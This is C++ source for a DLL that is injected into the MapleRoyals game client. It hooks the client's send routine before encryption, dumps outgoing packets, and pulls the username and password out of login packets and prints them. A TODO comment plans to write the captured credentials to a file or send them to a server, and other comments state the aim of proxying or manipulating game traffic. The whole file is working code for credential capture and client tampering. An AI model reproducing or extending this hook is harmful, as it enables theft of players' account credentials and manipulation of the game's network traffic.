// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <string.h>
#include<stdio.h>

#define PACKET_HEADER_SIZE 0x4
#define PACKET_IDENTIFIER_SIZE 0x2

static void hexdump(void* pAddressIn, long  lSize);
static void OpenConsole();
static bool Hook(void* toHook, void* ourFunct, int len);
static void SendPacketCallback();
static DWORD WINAPI MainThread(LPVOID param);
static BOOL WINAPI DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID lpReserved);

void* ModuleBase = GetModuleHandle(L"MapleRoyals.exe");

static ULONG COutPacketAddr = 0x9637B;
static ULONG CInPacketAddr =  0x965F1;

void* message_buff = NULL;
int* opcodeparam;

DWORD jmpBack_SendPacket;
DWORD jmpBack_RecvPacket;

static void hexdump(void *pAddressIn, long  lSize)
{
	char szBuf[100];
	long lIndent = 1;
	long lOutLen, lIndex, lIndex2, lOutLen2;
	long lRelPos;
	struct { char *pData; unsigned long lSize; } buf;
	unsigned char *pTmp, ucTmp;
	unsigned char *pAddress = (unsigned char *)pAddressIn;

	buf.pData = (char *)pAddress;
	buf.lSize = lSize;

	while (buf.lSize > 0)
	{
		pTmp = (unsigned char *)buf.pData;
		lOutLen = (int)buf.lSize;
		if (lOutLen > 16)
			lOutLen = 16;

		sprintf(szBuf, " >                            "
			"                      "
			"    %08lX", pTmp - pAddress);
		lOutLen2 = lOutLen;

		for (lIndex = 1 + lIndent, lIndex2 = 53 - 15 + lIndent, lRelPos = 0;
			lOutLen2;
			lOutLen2--, lIndex += 2, lIndex2++
			)
		{
			ucTmp = *pTmp++;

			sprintf(szBuf + lIndex, "%02X ", (unsigned short)ucTmp);
			if (!isprint(ucTmp))  ucTmp = '.';
			szBuf[lIndex2] = ucTmp;

			if (!(++lRelPos & 3))
			{
				lIndex++; szBuf[lIndex + 2] = ' ';
			}
		}

		if (!(lRelPos & 3)) lIndex--;

		szBuf[lIndex] = '<';
		szBuf[lIndex + 1] = ' ';

		printf("%s\n", szBuf);

		buf.pData += lOutLen;
		buf.lSize -= lOutLen;
	}
}

static void OpenConsole()
{
	AllocConsole();
	freopen("conin$", "r", stdin);
	freopen("conout$", "w", stdout);
	freopen("conout$", "w", stderr);
	HWND consoleHandle = GetConsoleWindow();
	MoveWindow(consoleHandle, 1, 1, 680, 480, 1);
	printf("Console initialized.\n");
}



static bool Hook(void* toHook, void* ourFunct, int len) {
	if (len < 5) {
		return false;
	}

	DWORD curProtection;
	VirtualProtect(toHook, len, PAGE_EXECUTE_READWRITE, &curProtection);

	memset(toHook, 0x90, len);

	DWORD relativeAddress = ((DWORD)ourFunct - (DWORD)toHook) - 5;

	*(BYTE*)toHook = 0xE9;
	*(DWORD*)((DWORD)toHook + 1) = relativeAddress;

	DWORD temp;
	VirtualProtect(toHook, len, curProtection, &temp);

	return true;
}

//The goal is to hook Mapleroyals Encryption function before the send and recv functions in order to proxy or 
//manipulate packet coming and going from the game client.



/*Message login example: 01 00 0B 00 6D 79 75 73 65 72 6E 61 6D 65 31 07 00 6D 79 70 61 73 73 77 0A 00 27 00 00 13 95 E9 EF 5A 00 00 00 00 C1 55 00 00 00 00 02 00 00 00 00 00 00*/
static bool check_for_password(char* message_buff) {
	char login_identifier[] = { 0x01, 0x00};
	bool compare = true;

	//int n = memcmp(login_identifier, message_buff, sizeof(login_identifier));

	for (int i = 0; i < 2; i++)
	{
		if (login_identifier[i] != message_buff[i])
		{
			compare = false;
		}
	}

	return compare;
}

static void record_password(char* message_buff) {
	char* cur = message_buff + PACKET_HEADER_SIZE;
	int usernamelen = (short int) *(message_buff + PACKET_IDENTIFIER_SIZE);
	short int passwordlen = (short int) *(cur + usernamelen);
	char username[20], password[20];

	memset(username, 0, 20);
	memset(password, 0, 20);

	strncpy_s(username, cur, usernamelen);
	cur = cur + usernamelen + 0x2;
	strncpy_s(password, cur, passwordlen);

	/*TODO: Write to file or Send records to server*/

	printf("Username: %s\n", username);
	printf("Password: %s\n", password);

	return;
}

static void SendPacketCallback() {

	if (check_for_password((char*)message_buff)){
		printf("Password match found!\n");
		record_password((char*)message_buff);
	}

	hexdump(message_buff, 40);
	printf("\n Packet has come~!\n");
	
	//Create the opcode that has been run over
	opcodeparam = ((int*)ModuleBase) + 0x68126C;
}


void __declspec(naked) SendPacketHook() {

	__asm {
		//Save registers
		pushad;
		//Set global parameter message_buffer for SendPacketCallback
		mov eax, [ebp - 18h];
		mov message_buff, eax;

		call SendPacketCallback;
		//Restore registers
		popad;

		//The first 5 bytes that run over by the hook
		mov eax, opcodeparam;
		//jump back to the normal execution of the function.
		jmp[jmpBack_SendPacket];
	}
}

static DWORD WINAPI MainThread(LPVOID param) {
	int hookLength = 5;
	DWORD hookAddress = 0x00;

	OpenConsole();
	ModuleBase = GetModuleHandle(L"MapleRoyals.exe");
	printf("Mapleroyals.exe address: %p\n", ModuleBase);

	//send packet hook
	hookAddress = (DWORD)ModuleBase + (DWORD)COutPacketAddr; // Pointer to send func (before encryption)
	jmpBack_SendPacket = hookAddress + hookLength;
	Hook((void*)hookAddress, SendPacketHook, hookLength);

	//recv packet hook
	/*
	hookAddress = (DWORD)ModuleBase + (DWORD)CInPacketAddr; // Pointer to recv func (before decryption)
	jmpBack_RecvPacket = hookAddress + hookLength;
	Hook((void*)hookAddress, SendPacketHook, hookLength);
	*/

	while (true) {
		if (GetAsyncKeyState(VK_ESCAPE)) break;
		Sleep(50);
	}

	FreeLibraryAndExitThread((HMODULE)param, 0);

	return 0;
}

static BOOL WINAPI DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID lpReserved) {
	switch (dwReason) {
	case DLL_PROCESS_ATTACH:
		CreateThread(0, 0, MainThread, hModule, 0, 0);
		break;
	}

	return TRUE;
}